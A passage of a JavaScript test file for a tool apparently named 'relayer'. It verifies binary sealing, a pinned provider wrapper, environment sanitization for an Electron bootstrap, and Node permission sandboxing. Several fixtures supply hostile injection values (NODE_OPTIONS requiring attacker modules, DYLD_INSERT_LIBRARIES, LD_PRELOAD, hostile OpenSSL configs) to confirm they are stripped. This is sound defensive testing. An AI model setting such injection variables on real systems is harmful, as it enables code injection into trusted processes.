          { label: "an echo target swap after codesign", source: realpathSync("/bin/echo"), hook: "afterCodesign" },
          { label: "an echo target swap before publication", source: realpathSync("/bin/echo"), hook: "beforeTargetPublication" },
          { label: "a zstd scratch swap after install_name_tool", source: realpathSync(HOMEBREW_ZSTD_PATH), hook: "afterInstallNameTool", scratchSwap: true },
          { label: "an echo scratch swap after codesign", source: realpathSync("/bin/echo"), hook: "afterCodesign", scratchSwap: true },
        ];
        for (const [index, testCase] of cases.entries()) {
          const directory = realpathSync(mkdtempSync(join(tmpdir(), `relayer-mutator-swap-${index}-`)));
          const target = join(directory, testCase.hook === "afterInstallNameTool" ? "libzstd.1.dylib" : basename(testCase.source));
          copyFileSync(testCase.source, target);
          chmodSync(target, 0o700);
          const sourceSha256 = createHash("sha256").update(readFileSync(testCase.source)).digest("hex");
          const targetAuthority = captureExactRegularFileIdentity(target);
          const swap = (_target, scratch) => {
            const swappedPath = testCase.scratchSwap ? scratch : target;
            renameSync(swappedPath, `${swappedPath}.captured`);
            copyFileSync(testCase.scratchSwap ? "/bin/cat" : testCase.source, swappedPath);
          };
          try {
            expect(() => sealMachORuntimeCopies({
              sourceSpecs: [{ source: testCase.source, target, sourceSha256, targetAuthority }],
              runtimeRoot: directory,
              rootExecutable: target,
              otoolPath,
              installNameToolPath,
              [testCase.hook]: swap,
            }), `${testCase.label} is detected`).toThrow(/changed during mutation|no longer resolves to its held file|dependency inventory differs|content payload differs|load-command vector differs|fixed header differs/);
            if (testCase.scratchSwap) {
              expect(createHash("sha256").update(readFileSync(target)).digest("hex"), `${testCase.label} rolls the target back`).toBe(sourceSha256);
            }
          } finally {
            rmSync(directory, { recursive: true, force: true });
          }
        }
      }

      if (nodeAvailable) {
        const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-sealed-node-runtime-")));
        const runtime = join(directory, "runtime");
        const scratch = join(directory, "scratch");
        const profile = join(directory, "node.sb");
        try {
          mkdirSync(runtime);
          mkdirSync(scratch);
          const sourceNode = realpathSync(HOMEBREW_NODE_PATH);
          const sourceClosure = discoverNonSystemMachODependencies({ executables: [sourceNode], timeoutMs: 30_000, otoolPath });
          const sourceSpecs = [{ source: sourceNode, target: join(runtime, "node") }];
          for (const [name, authority] of sourceClosure) sourceSpecs.push({ source: authority.source, target: join(runtime, name) });
          for (const spec of sourceSpecs) {
            copyFileSync(spec.source, spec.target);
            chmodSync(spec.target, 0o700);
            spec.sourceSha256 = createHash("sha256").update(readFileSync(spec.source)).digest("hex");
            spec.targetAuthority = captureExactRegularFileIdentity(spec.target);
          }
          const sealedClosure = sealMachORuntimeCopies({
            sourceSpecs,
            runtimeRoot: runtime,
            rootExecutable: join(runtime, "node"),
            timeoutMs: 30_000,
            otoolPath,
            installNameToolPath,
          });
          expect(sealedClosure.map(([name]) => name), "the sealed closure mirrors the source closure").toEqual(sourceClosure.map(([name]) => name));
          for (const spec of sourceSpecs) {
            const rewritten = execFileSync(otoolPath, ["-L", spec.target], {
              encoding: "utf8", env: { PATH: "/usr/bin:/bin", LANG: "C", LC_ALL: "C" },
            });
            expect(rewritten, `${basename(spec.target)} drops external Homebrew references`).not.toContain("/opt/homebrew/");
            for (const section of parseOtoolLibraryDependencySections(rewritten, spec.target)) {
              for (const dependency of section.dependencies) {
                expect(dependency.startsWith("/System/Library/") || dependency.startsWith("/usr/lib/")
                  || dependency.startsWith("@loader_path/"), `${basename(spec.target)} keeps ${dependency} within sealed system paths`).toBe(true);
              }
            }
          }
          writeFileSync(profile, createPinnedFreshBuildSandboxProfile({
            readPaths: [runtime, "/System/Library", "/System/Volumes/Preboot/Cryptexes/OS", "/usr/lib", "/dev", "/private/var/db/timezone"],
            writePaths: [scratch],
            executablePaths: [join(runtime, "node")],
          }));
          const execution = spawnSync("/usr/bin/sandbox-exec", [
            "-f", profile, join(runtime, "node"), "-e", "process.stdout.write('sealed-node-ok')",
          ], { encoding: "utf8", env: { PATH: "/usr/bin:/bin", LANG: "C", LC_ALL: "C", OPENSSL_CONF: "/dev/null" } });
          expect(execution.status, `sealed node executes inside the fresh-build sandbox: ${execution.stderr}`).toBe(0);
          expect(execution.stdout, "sealed node prints its payload").toBe("sealed-node-ok");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }

        const swapDirectory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-seal-swap-")));
        const source = realpathSync(HOMEBREW_NODE_PATH);
        const target = join(swapDirectory, "node");
        const sourceSha256 = createHash("sha256").update(readFileSync(source)).digest("hex");
        try {
          copyFileSync(source, target);
          const authority = captureExactRegularFileIdentity(target);
          rmSync(target);
          symlinkSync(source, target);
          expect(() => sealMachORuntimeCopies({
            sourceSpecs: [{ source, target, sourceSha256, targetAuthority: authority }],
            runtimeRoot: swapDirectory,
            rootExecutable: target,
            otoolPath,
            installNameToolPath,
          }), "a symlink substitution of the sealing target").toThrow(/exact regular file|changed during mutation/);
          rmSync(target);
          copyFileSync(source, target);
          const originalAuthority = captureExactRegularFileIdentity(target);
          rmSync(target);
          copyFileSync(source, target);
          expect(() => sealMachORuntimeCopies({
            sourceSpecs: [{ source, target, sourceSha256, targetAuthority: originalAuthority }],
            runtimeRoot: swapDirectory,
            rootExecutable: target,
            otoolPath,
            installNameToolPath,
          }), "a same-byte inode substitution of the sealing target").toThrow("changed during mutation");
        } finally {
          rmSync(swapDirectory, { recursive: true, force: true });
        }
      }
    },
    120_000,
  );
  it("executes the pinned provider wrapper and rejects unpinnable wrapper paths", () => {
    const pathRejections = [
      ["a Node interpreter with spaces", { nodePath: "/tmp/node with spaces", codexPath: "/tmp/codex", pidFile: "/tmp/provider.pid" }, "shebang interpreter"],
      ["a relative Codex path", { nodePath: "/usr/bin/node", codexPath: "codex", pidFile: "/tmp/provider.pid" }, "absolute single-line path"],
    ];
    expect(pathRejections, "wrapper path rejection inventory").toHaveLength(2);
    for (const [label, input, message] of pathRejections) {
      expect.soft(() => createPinnedProviderWrapperScript(input), label).toThrow(message);
    }
    if (process.platform === "win32") return;
    const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-test-"));
    try {
      const codexPath = join(directory, "fake'codex");
      const pidFile = join(directory, "provider'pid");
      const wrapperPath = join(directory, "codex-provider-wrapper");
      writeFileSync(codexPath, "#!/bin/sh\nprintf '%s|%s\\n' \"$$\" \"$1\"\n", { mode: 0o700 });
      writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
        nodePath: process.execPath,
        codexPath,
        pidFile,
      }), { mode: 0o700 });
      chmodSync(wrapperPath, 0o700);

      const output = execFileSync(wrapperPath, ["forwarded argument"], { encoding: "utf8" }).trim();
      const [executedPid, argument] = output.split("|");
      expect(readFileSync(pidFile, "utf8").trim(), "the wrapper publishes the executed Codex PID").toBe(executedPid);
      expect(argument, "the wrapper forwards provider arguments").toBe("forwarded argument");
      expect(readFileSync(wrapperPath, "utf8").split("\n")[0], "the wrapper shebang pins the exact Node interpreter").toBe(`#!${process.execPath}`);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== "win32")(
    "terminates, force-kills, and child-kills the pinned provider wrapper on failure paths",
    async () => {
      {
        const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-failure-test-"));
        try {
          const wrapperPath = join(directory, "codex-provider-wrapper");
          writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
            nodePath: process.execPath,
            codexPath: join(directory, "missing-codex"),
            pidFile: join(directory, "provider.pid"),
          }), { mode: 0o700 });
          const result = spawnSync(wrapperPath, [], { encoding: "utf8", timeout: 1_000 });
          expect(result.error, "a missing Codex executable exits synchronously").toBeUndefined();
          expect(result.status, "a missing Codex executable exits nonzero").toBe(1);
          expect(result.stderr, "a missing Codex executable surfaces ENOENT").toContain("ENOENT");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
      {
        const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-pid-failure-test-"));
        try {
          const codexPath = join(directory, "fake-codex");
          const wrapperPath = join(directory, "codex-provider-wrapper");
          writeFileSync(codexPath, "#!/bin/sh\nwhile :; do sleep 1; done\n", { mode: 0o700 });
          writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
            nodePath: process.execPath,
            codexPath,
            pidFile: directory,
          }), { mode: 0o700 });

          const result = spawnSync(wrapperPath, [], { encoding: "utf8", timeout: 2_000 });
          expect(result.error, "PID publication failure exits synchronously").toBeUndefined();
          expect(result.status, "PID publication failure exits nonzero").toBe(1);
          expect(result.signal, "PID publication failure is not signaled").toBeNull();
          const childPid = Number(result.stderr.match(/Failed to publish Codex provider PID (\d+):/)?.[1]);
          expect(Number.isSafeInteger(childPid), "PID publication failure names the spawned child PID").toBe(true);
          expect(() => process.kill(childPid, 0), "the spawned Codex child is killed when PID publication fails").toThrow(expect.objectContaining({ code: "ESRCH" }));
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
      const directory = mkdtempSync(join(tmpdir(), "relayer-provider-wrapper-force-test-"));
      const codexPath = join(directory, "stuck-codex");
      const pidFile = join(directory, "provider.pid");
      const wrapperPath = join(directory, "codex-provider-wrapper");
      let wrapper;
      let providerPid;
      try {
        writeFileSync(codexPath, [
          `#!${process.execPath}`,
          'process.on("SIGTERM", () => {});',
          "setInterval(() => {}, 1_000);",
          "",
        ].join("\n"), { mode: 0o700 });
        writeFileSync(wrapperPath, createPinnedProviderWrapperScript({
          nodePath: process.execPath,
          codexPath,
          pidFile,
        }), { mode: 0o700 });
        wrapper = spawn(wrapperPath, [], { stdio: "ignore" });
        await vi.waitFor(() => expect(readFileSync(pidFile, "utf8").trim()).toMatch(/^\d+$/));
        providerPid = Number(readFileSync(pidFile, "utf8").trim());

        process.kill(wrapper.pid, "SIGUSR2");
        const exit = await new Promise((resolve, reject) => {
          const timeout = setTimeout(() => reject(new Error("provider wrapper did not exit after force-close")), 1_000);
          wrapper.once("exit", (code, signal) => {
            clearTimeout(timeout);
            resolve({ code, signal });
          });
        });

        expect(exit, "force-close kills the wrapper with SIGKILL").toEqual({ code: null, signal: "SIGKILL" });
        expect(() => process.kill(providerPid, 0), "force-close kills the provider child").toThrow();
      } finally {
        try { if (providerPid) process.kill(providerPid, "SIGKILL"); } catch {}
        try { if (wrapper?.pid) process.kill(wrapper.pid, "SIGKILL"); } catch {}
        rmSync(directory, { recursive: true, force: true });
      }
    },
    15_000,
  );

  it("wires the pinned wrapper, exec policy, and immutable runtime copies into the capture sequence", () => {
    const capture = readCaptureScript();
    expect(createPinnedGraphAuthoringExecPolicy("/private/tmp/runtime/graph-authoring-launcher"),
      "the exec policy allows only the pinned no-argument launcher").toBe(
      'prefix_rule(pattern=["/private/tmp/runtime/graph-authoring-launcher"], decision="allow")\n',
    );
    expect(() => createPinnedGraphAuthoringExecPolicy("relative/launcher"),
      "the exec policy rejects relative launcher paths").toThrow(/safe absolute launcher path/);

    expect(capture, "capture resolves the wrapper Node copy").toContain('const nodePath = join(snapshotRoot, "node");');
    expect(capture, "capture inventories the provider wrapper").toContain('key: "codex-provider-wrapper",\n    source: providerWrapperSource');
    expect(capture.indexOf("await prepareProviderWrapperSource(snapshotRoot);"),
      "the wrapper copy precedes the source runtime inventory").toBeLessThan(capture.indexOf('"source runtime inventory"'));
    expect(capture.indexOf('"source runtime inventory"'),
      "the source runtime inventory precedes immutable runtime preparation").toBeLessThan(capture.indexOf("() => prepareImmutableRuntime(capturedSourceRuntimeArtifacts)"));
    expect(capture, "capture selects the SDK executable through the copied wrapper").toContain('providerWrapper = specs.find((spec) => spec.key === "codex-provider-wrapper").source;');
    expect(capture, "capture overrides the codex path with the copied wrapper").toContain("codexPathOverride: providerWrapper");

    expect(capture, "capture pins the graph-authoring exec policy").toContain('createPinnedGraphAuthoringExecPolicy(graphAuthoringLauncher)');
    expect(capture, "capture does not preauthorize an unpinned zsh launcher").not.toContain('prefix_rule(pattern=["/bin/zsh", "-lc"]');

    expect(capture, "capture records read-only snapshot directory authorities").toContain("await captureReadOnlyDirectoryAuthorities(target, runtimeSnapshotReadOnlyDirectoryAuthorities);");
    expect(capture, "capture restores read-only snapshot directory authorities before cleanup").toContain("...runtimeSnapshotReadOnlyDirectoryAuthorities");
    expect(capture, "capture fails closed when snapshot directory authority changes").toContain("Fresh build or runtime snapshot directory authority changed before cleanup.");

    const cleanGate = capture.indexOf("const sourceCommit = cleanSourceRevision(sourceGit, sourceRepositoryRoot);");
    expect(cleanGate, "capture gates copies behind a clean source revision").toBeGreaterThan(-1);
    expect(cleanGate, "the clean revision gate precedes ditto copies").toBeLessThan(capture.indexOf('execFileSync("/usr/bin/ditto"'));
    expect(cleanGate, "the clean revision gate precedes bootstrap controls").toBeLessThan(capture.indexOf("const bootstrapControls = new Map"));
    expect(capture, "capture inventories runtime copies").toContain("() => runtimeArtifactInventory(sourceRuntimeArtifactSpecs)");
    expect(capture, "capture prepares immutable runtime copies").toContain("() => prepareImmutableRuntime(capturedSourceRuntimeArtifacts)");
    expect(capture, "capture verifies immutable copies against inventoried source bytes").toContain("Immutable runtime copies do not match their inventoried source bytes.");
    expect(capture, "capture verifies the source inventory against the clean revision").toContain("await verifySourceInventoryMatchesRevision(sourceRuntimeArtifacts);");
    expect(capture, "capture records the runtime inventory digest").toContain("runtimeArtifactInventorySha256");
    expect(capture, "capture pins the system git path").toContain('const SYSTEM_GIT_PATH = "/usr/bin/git";');
    expect(capture, "capture pins the sandbox-exec path").toContain('const SYSTEM_SANDBOX_EXEC_PATH = "/usr/bin/sandbox-exec";');
    expect(capture, "capture inventories sandbox-exec as an external sealed-system tool").toContain('{ key: "sandbox-exec", source: SOURCE_SANDBOX_EXEC_PATH, label: "<sandbox-executable>", copy: false, provenance: "external", discoveredSha256: discoveredMachOSha256(SOURCE_SANDBOX_EXEC_PATH), allowHardlinks: sealedSystemHardlinkPolicy(SOURCE_SANDBOX_EXEC_PATH) }');
    expect(capture, "capture writes the graph-authoring network profile").toContain('target: "graph-authoring-network.sb"');
    expect(capture, "capture pins the sandbox-exec path for the launcher").toContain("sandboxExecPath: SOURCE_SANDBOX_EXEC_PATH");
    expect(capture, "capture threads the network profile into the launcher").toContain('networkProfilePath: join(canonicalSnapshotRoot, "graph-authoring-network.sb")');
    expect(capture, "capture never resolves git through PATH overrides").not.toContain('process.env.RELAYER_GIT_PATH || "git"');

    expect(capture, "capture resolves the source sed executable").toContain('const SOURCE_SED_PATH = resolveExecutable(process.env.RELAYER_SED_PATH || "sed");');
    expect(capture, "capture resolves the source ripgrep executable").toContain('const SOURCE_RG_PATH = resolveExecutable(process.env.RELAYER_RG_PATH || "rg");');
    expect(capture, "capture copies and inventories the sed executable").toContain('{ key: "sed", source: SOURCE_SED_PATH, label: "<sed-executable>", copy: true, provenance: "external", discoveredSha256: discoveredMachOSha256(SOURCE_SED_PATH), allowHardlinks: sealedSystemHardlinkPolicy(SOURCE_SED_PATH) }');
    expect(capture, "capture copies and inventories the ripgrep executable").toContain('{ key: "rg", source: SOURCE_RG_PATH, label: "<ripgrep-executable>", copy: true, provenance: "external", discoveredSha256: discoveredMachOSha256(SOURCE_RG_PATH) }');
    expect(capture, "capture selects the pinned sed path from inventory").toContain('SED_PATH = specs.find((spec) => spec.key === "sed").source;');
    expect(capture, "capture selects the pinned ripgrep path from inventory").toContain('RG_PATH = specs.find((spec) => spec.key === "rg").source;');
    expect(capture, "capture authorizes the redacted sed path").toContain("allowedSedExecutable: redactedSedExecutable");
    expect(capture, "capture authorizes sed bytes by inventory digest").toContain('allowedSedExecutableSha256: createHash("sha256").update(SED_PATH).digest("hex")');
    expect(capture, "capture authorizes the redacted ripgrep path").toContain("allowedRipgrepExecutable: redactedRipgrepExecutable");
    expect(capture, "capture authorizes ripgrep bytes by inventory digest").toContain('allowedRipgrepExecutableSha256: createHash("sha256").update(RG_PATH).digest("hex")');
    expect(capture, "capture never resolves sed or rg from PATH").toContain("never resolve sed or rg from PATH");
  });
  it("launches the authenticated Electron bootstrap through a sanitized preload-free chain", async () => {
    expect(sanitizeElectronBootstrapEnvironment({
      SAFE_BOOTSTRAP_VALUE: "retained",
      NODE_OPTIONS: "--require=/tmp/attacker.cjs --experimental-loader=/tmp/attacker.mjs",
      node_path: "/tmp/hostile-modules",
      NODE_REPL_EXTERNAL_MODULE: "/tmp/repl-loader.mjs",
      NODE_EXTRA_CA_CERTS: "/tmp/hostile-ca.pem",
      ELECTRON_RUN_AS_NODE: "1",
      electron_no_asar: "1",
      DYLD_INSERT_LIBRARIES: "/tmp/attacker.dylib",
      ld_preload: "/tmp/attacker.so",
      LD_AUDIT: "/tmp/attacker-audit.so",
      OPENSSL_CONF: "/tmp/hostile-openssl.cnf",
      openssl_modules: "/tmp/hostile-modules",
      OpEnSsL_EnGiNeS: "/tmp/hostile-engines",
      OMITTED_VALUE: undefined,
    }), "bootstrap sanitization strips every runtime injection override").toEqual({ SAFE_BOOTSTRAP_VALUE: "retained" });
    const capture = readCaptureScript();
    expect(capture, "capture sanitizes the bootstrap environment").toContain("return sanitizeElectronBootstrapEnvironment(process.env);");
    expect(capture, "capture launches with the sanitized environment").toContain("...bootstrapEnvironment(),");
    expect(capture, "capture never spreads raw process.env into Electron").not.toContain("...process.env,\n        [IMMUTABLE_ELECTRON_ROOT]");

    const packageJson = JSON.parse(readFileSync(join(import.meta.dirname, "..", "package.json"), "utf8"));
    expect(packageJson.scripts["evidence:ask-profile"], "no npm script bypasses the trusted launcher").toBeUndefined();

    const launcher = join(import.meta.dirname, "..", "scripts", "launch-ask-profile-evidence.sh");
    const launcherSource = readFileSync(launcher, "utf8");
    const completedUnsetLoop = launcherSource.indexOf("IFS=$saved_ifs");
    expect(completedUnsetLoop, "the launcher completes its unset loop").toBeGreaterThan(0);
    expect(launcherSource.indexOf("set -eu"), "strict mode starts after the unset loop").toBeGreaterThan(completedUnsetLoop);
    expect(launcherSource.indexOf("/usr/bin/", completedUnsetLoop), "fixed /usr/bin paths appear after the unset loop").toBeGreaterThan(completedUnsetLoop);
    expect(launcherSource.slice(0, completedUnsetLoop), "no /usr/bin path precedes the unset loop").not.toContain("/usr/bin/");
    expect(launcherSource, "the launcher takes the Node path as its only argument").toContain("node_path=${1:-}");
    expect(launcherSource, "the launcher takes no npm CLI argument").not.toContain("npm_cli_path=${2:-}");
    expect(launcherSource, "the launcher never rebuilds the app").not.toContain("npm run build");
    expect(launcherSource, "the launcher ignores npm_node_execpath").not.toContain("npm_node_execpath");
    expect(launcherSource, "the launcher never execs npm's Node").not.toContain('exec "$npm_node_execpath"');
    expect(launcherSource, "the launcher authenticates control files against the source commit").toContain('rev-parse "$source_commit:$control_file"');
    expect(launcherSource, "the launcher hashes control files without filters").toContain('hash-object --no-filters "$repository_root/$control_file"');
    expect(launcherSource, "the launcher disables Git replacement objects").toContain('GIT_NO_REPLACE_OBJECTS=1');
    expect(launcherSource, "the launcher materializes control files from commit bytes").toContain('show "$source_commit:$control_file" > "$bootstrap_root/$control_file"');
    expect(launcherSource, "the launcher holds the entry module by descriptor").toContain('exec 3< "$bootstrap_root/scripts/launch-ask-profile-evidence.mjs"');
    expect(launcherSource, "the launcher removes the entry module pathname").toContain('/bin/rm "$bootstrap_root/scripts/launch-ask-profile-evidence.mjs"');
    expect(launcherSource, "the launcher execs the held module bytes through the trusted Node").toContain('exec "$node_path" --input-type=module - "$bootstrap_root" "$repository_root" "$source_commit" <&3');
    expect(launcherSource, "the launcher never derives scripts from a pathname lookup").not.toContain("script_directory=$(pwd -P)/scripts");
    if (process.platform === "darwin") {
      const probe = execFileSync("/bin/sh", [launcher], {
        encoding: "utf8",
        env: {
          SAFE_VALUE: "retained",
          RELAYER_ASK_PROFILE_LAUNCHER_PROBE: "1",
          NODE_OPTIONS: "--require=/tmp/attacker.cjs",
          NoDe_FUTURE_OVERRIDE: "/tmp/future-node-hook",
          electron_override_dist_path: "/tmp/hostile-electron",
          ElEcTrOn_FuTuRe_Override: "/tmp/future-electron-hook",
          DYLD_INSERT_LIBRARIES: "/tmp/attacker.dylib",
          DyLd_FuTuRe_Override: "/tmp/future-dyld-hook",
          ld_preload: "/tmp/attacker.so",
          Ld_FuTuRe_Override: "/tmp/future-ld-hook",
          npm_node_execpath: "/tmp/hostile-node",
          npm_execpath: "/tmp/hostile-npm-cli.js",
          OPENSSL_CONF: "/tmp/hostile-openssl.cnf",
          openssl_modules: "/tmp/hostile-modules",
          OpEnSsL_EnGiNeS: "/tmp/hostile-engines",
        },
      });
      expect(probe, "the launcher probe retains safe environment values").toContain("SAFE_VALUE=retained");
      const probeNames = probe.trim().split("\n").map((line) => line.slice(0, line.indexOf("=")));
      expect(probeNames.some((name) => /^(?:NODE_|NPM_|ELECTRON_|DYLD_|LD_|OPENSSL_)/i.test(name)),
        "the launcher probe strips every injection-capable environment family").toBe(false);

      const unrelatedCwd = mkdtempSync(join(tmpdir(), "relayer-launcher-cwd-"));
      try {
        const pathProbe = execFileSync("/bin/sh", [launcher], {
          cwd: unrelatedCwd,
          encoding: "utf8",
          env: { RELAYER_ASK_PROFILE_PATH_PROBE: "1" },
        }).trim();
        expect(pathProbe, "the launcher resolves the repository root independently of cwd").toBe(realpathSync(join(import.meta.dirname, "..")));
      } finally {
        rmSync(unrelatedCwd, { recursive: true, force: true });
      }
    }

    const { launchAskProfileEvidence, resolveInstalledElectronExecutable, authenticateBootstrapControls } = await import("../scripts/launch-ask-profile-evidence.mjs");
    const calls = [];
    const signalHandlers = [];
    const child = { once() { return this; }, kill() { return true; } };
    const returned = launchAskProfileEvidence({
      environment: {
        RELAYER_CAPTURE_ASK_PROFILE_EVIDENCE: "1",
        SAFE_VALUE: "retained",
        NODE_OPTIONS: "--require=/tmp/attacker.cjs",
        node_path: "/tmp/hostile-modules",
        ELECTRON_RUN_AS_NODE: "1",
        electron_override_dist_path: "/tmp/hostile-electron",
        DYLD_INSERT_LIBRARIES: "/tmp/attacker.dylib",
        ld_preload: "/tmp/attacker.so",
        OPENSSL_CONF: "/tmp/hostile-openssl.cnf",
        openssl_modules: "/tmp/hostile-modules",
        OpEnSsL_EnGiNeS: "/tmp/hostile-engines",
      },
      electronExecutable: "/trusted/Electron",
      captureScript: "/trusted/capture.mjs",
      spawnProcess: (...args) => { calls.push(args); return child; },
      signalTarget: { once: (...args) => signalHandlers.push(args) },
      controlAuthenticator: () => calls.push(["controls"]),
      electronAuthenticator: () => { calls.push(["authenticate"]); return { dev: 1n, ino: 2n, sha256: "trusted" }; },
      electronStabilityCheck: () => calls.push(["stability"]),
    });
    expect(returned, "the launcher returns the spawned Electron child").toBe(child);
    expect(calls, "the launcher authenticates controls, Electron bytes, and stability before spawning").toEqual([["controls"], ["authenticate"], ["stability"], [
      "/trusted/Electron",
      ["/trusted/capture.mjs", "--source-repository-root", join(import.meta.dirname, ".."), "--source-commit", "HEAD"],
      {
        cwd: join(import.meta.dirname, ".."),
        env: { RELAYER_CAPTURE_ASK_PROFILE_EVIDENCE: "1", SAFE_VALUE: "retained" },
        stdio: "inherit",
      },
    ]]);
    expect(signalHandlers.map(([signal]) => signal), "the launcher forwards interruption signals").toEqual(["SIGINT", "SIGTERM"]);

    expect(capture, "capture copies the shell launcher into the bootstrap root").toContain('"launch-ask-profile-evidence.sh"');
    expect(capture, "capture copies the module launcher into the bootstrap root").toContain('"launch-ask-profile-evidence.mjs"');
    expect(capture, "capture authenticates every bootstrap control file").toContain("...BOOTSTRAP_CONTROL_FILES.map((name) => ({");
    expect(capture.indexOf('process.argv.indexOf("--source-repository-root")'),
      "capture reads the requested repository root before trusting it").toBeLessThan(capture.indexOf("const sourceRepositoryRoot = requestedSourceRepositoryRoot()"));

    if (process.platform !== "win32") {
      const heldDirectory = mkdtempSync(join(tmpdir(), "relayer-held-launcher-"));
      const heldLauncher = join(heldDirectory, "launcher.mjs");
      let descriptor;
      try {
        writeFileSync(heldLauncher, 'process.stdout.write("authenticated launcher bytes\\n");\n');
        descriptor = openSync(heldLauncher, "r");
        unlinkSync(heldLauncher);
        writeFileSync(heldLauncher, 'process.stdout.write("replacement pathname bytes\\n");\n');
        const result = spawnSync(process.execPath, ["--input-type=module", "-"], {
          stdio: [descriptor, "pipe", "pipe"],
          encoding: "utf8",
        });
        expect(result.status, "held launcher bytes execute cleanly").toBe(0);
        expect(result.stdout, "held launcher bytes survive pathname replacement").toBe("authenticated launcher bytes\n");
        expect(result.stderr, "held launcher execution is silent").toBe("");
      } finally {
        if (descriptor !== undefined) closeSync(descriptor);
        rmSync(heldDirectory, { recursive: true, force: true });
      }
    }

    const fixture = mkdtempSync(join(tmpdir(), "relayer-electron-package-"));
    const packageRoot = join(fixture, "node_modules", "electron");
    const relativeExecutable = process.platform === "darwin"
      ? join("Electron.app", "Contents", "MacOS", "Electron")
      : process.platform === "win32" ? "electron.exe" : "electron";
    const expectedExecutable = join(packageRoot, "dist", relativeExecutable);
    try {
      mkdirSync(dirname(expectedExecutable), { recursive: true });
      writeFileSync(join(fixture, "package.json"), '{"private":true}\n');
      writeFileSync(join(packageRoot, "package.json"), '{"name":"electron","version":"0.0.0-test"}\n');
      writeFileSync(join(packageRoot, "path.txt"), `${relativeExecutable}\n`);
      writeFileSync(expectedExecutable, "fake Electron executable\n", { mode: 0o755 });
      chmodSync(expectedExecutable, 0o755);

      const executable = resolveInstalledElectronExecutable(join(fixture, "package.json"));
      expect(executable, "the installed Electron resolves through the host platform layout").toBe(realpathSync(expectedExecutable));
      if (process.platform === "darwin") {
        expect(executable, "darwin uses the app bundle executable").toContain("Electron.app/Contents/MacOS/Electron");
      } else if (process.platform === "win32") {
        expect(basename(executable).toLowerCase(), "win32 uses electron.exe").toBe("electron.exe");
      } else {
        expect(basename(executable), "posix uses the electron binary").toBe("electron");
      }
    } finally {
      rmSync(fixture, { recursive: true, force: true });
    }

    if (process.platform === "darwin") {
      const replaceFixture = mkdtempSync(join(tmpdir(), "relayer-bootstrap-replace-"));
      const executedBootstrapRoot = mkdtempSync(join(tmpdir(), "relayer-bootstrap-snapshot-"));
      const controlFiles = [
        "package.json",
        "package-lock.json",
        "scripts/launch-ask-profile-evidence.sh",
        "scripts/launch-ask-profile-evidence.mjs",
        "scripts/capture-ask-profile-evidence.mjs",
        "scripts/ask-profile-evidence-model.mjs",
        "scripts/evidence-capture-integrity.mjs",
      ];
      try {
        mkdirSync(join(replaceFixture, "scripts"));
        mkdirSync(join(executedBootstrapRoot, "scripts"));
        for (const controlFile of controlFiles) {
          writeFileSync(join(replaceFixture, controlFile), `committed ${controlFile}\n`);
          writeFileSync(join(executedBootstrapRoot, controlFile), `committed ${controlFile}\n`);
        }
        const git = (args) => execFileSync("/usr/bin/git", args, { cwd: replaceFixture, encoding: "utf8" }).trim();
        git(["init", "-q"]);
        git(["config", "user.name", "Bootstrap Test"]);
        git(["config", "user.email", "bootstrap@example.invalid"]);
        git(["add", "."]);
        git(["commit", "-qm", "committed controls"]);
        const originalCommit = git(["rev-parse", "HEAD"]);
        const branch = git(["symbolic-ref", "--short", "HEAD"]);
        writeFileSync(join(replaceFixture, "package.json"), "replacement-controlled bytes\n");
        git(["add", "package.json"]);
        git(["commit", "-qm", "replacement commit"]);
        const replacementCommit = git(["rev-parse", "HEAD"]);
        git(["update-ref", `refs/heads/${branch}`, originalCommit]);
        git(["replace", originalCommit, replacementCommit]);

        expect(() => authenticateBootstrapControls({ sourceRepositoryRoot: replaceFixture, executedBootstrapRoot, sourceCommit: originalCommit }),
          "bootstrap control authentication ignores Git replacement refs").not.toThrow();
      } finally {
        rmSync(replaceFixture, { recursive: true, force: true });
        rmSync(executedBootstrapRoot, { recursive: true, force: true });
      }
    }
  }, 30_000);
  it("enforces the graph-authoring boundary in the pinned Node runtime", async () => {
    const allowedRoot = join(import.meta.dirname, "..", "packages", "graph-client");
    const permissionDirectory = mkdtempSync(join(tmpdir(), "relayer-graph-authoring-permission-"));
    const privateFile = join(permissionDirectory, "private.txt");
    const privateModule = join(permissionDirectory, "private.mjs");
    try {
      const allowedModule = join(allowedRoot, "dist", "index.js");
      writeFileSync(privateFile, "personal evidence must remain unreadable\n");
      writeFileSync(privateModule, "export const privateValue = 'secret';\n");
      const flags = ["--permission", `--allow-fs-read=${allowedRoot}`, "--input-type=module"];

      const success = spawnSync(process.execPath, flags, {
        input: `const { NodeObject } = await import(${JSON.stringify(pathToFileURL(allowedModule).href)}); const node = new NodeObject("info", "Allowed", "Graph client loaded", "concept", "permission-test"); if (node.title !== "Allowed") process.exit(2);\n`,
        encoding: "utf8",
      });
      expect(success.status, "the permission runtime loads the allowed graph client").toBe(0);

      const denials = [
        ["a private file read", `const { readFile } = await import("node:fs/promises"); await readFile(${JSON.stringify(privateFile)}, "utf8");\n`],
        ["a private module import", `await import(${JSON.stringify(pathToFileURL(privateModule).href)});\n`],
      ];
      for (const [label, program] of denials) {
        const denied = spawnSync(process.execPath, flags, { input: program, encoding: "utf8" });
        expect(denied.status, `${label} exits nonzero under the permission runtime`).not.toBe(0);
        expect(`${denied.stdout}\n${denied.stderr}`, `${label} reports an access denial`).toMatch(/ERR_ACCESS_DENIED|permission/i);
      }
    } finally {
      rmSync(permissionDirectory, { recursive: true, force: true });
    }

    if (process.platform !== "darwin") return;
    const directory = mkdtempSync(join(tmpdir(), "relayer-graph-launcher-"));
    const graphClientRoot = join(import.meta.dirname, "..", "packages", "graph-client");
    const launcher = join(directory, "graph-authoring-launcher");
    const networkProfile = join(directory, "graph-authoring-network.sb");
    let attackerRequests = 0;
    let ipv6AttackerRequests = 0;
    const server = createServer((request, response) => {
      if (request.url !== "/api/graph/nodes/1" || request.headers.authorization !== "Bearer graph-token") {
        response.writeHead(403).end(JSON.stringify({ error: { message: "bad capability" } }));
        return;
      }
